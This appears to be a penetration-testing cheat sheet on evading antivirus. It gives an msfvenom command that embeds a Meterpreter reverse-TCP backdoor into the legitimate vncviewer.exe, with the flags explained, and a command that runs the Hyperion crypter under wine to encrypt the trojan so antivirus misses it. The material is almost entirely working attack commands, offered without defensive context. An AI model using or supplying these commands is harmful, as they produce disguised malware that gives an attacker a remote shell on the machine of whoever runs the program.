============================== Bypassing Antivirus  ======================================

Program:
Hyperion-1.1

Use:
-windows program to encrypt virus's and trojans with AES encryption, and then throw away the keys
-Hyperion decrypts on the other side by brute-force cracking the embedded program quickly

Embedding A Backdoor into a Windows Program (in this case vncviewer):
--->malicious backdoor executable will run alongside the legitimate windows application
-'-x' = bed inside of an executable
-'-k' = run executable on seperate thread
-'-f exe' = format set to executable
-LHOST = Local Host (User System)
-LPORT --> Local Port (User port to listen for reverse connection)

Command to embed backdoor to program:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IPAdress] LPORT=[PortNum] -x /usr/share/windows-binaries/vncviewer.exe -k -f exe > [NameOfExecutable].exe


Example Use of Running Hyperior to Bypass Antivirus:
wine ../hyperion.exe [PathToNameOfExecutableToEncrypt] ["NewFileName".exe]	---> 'wine' command is used to run windows programs
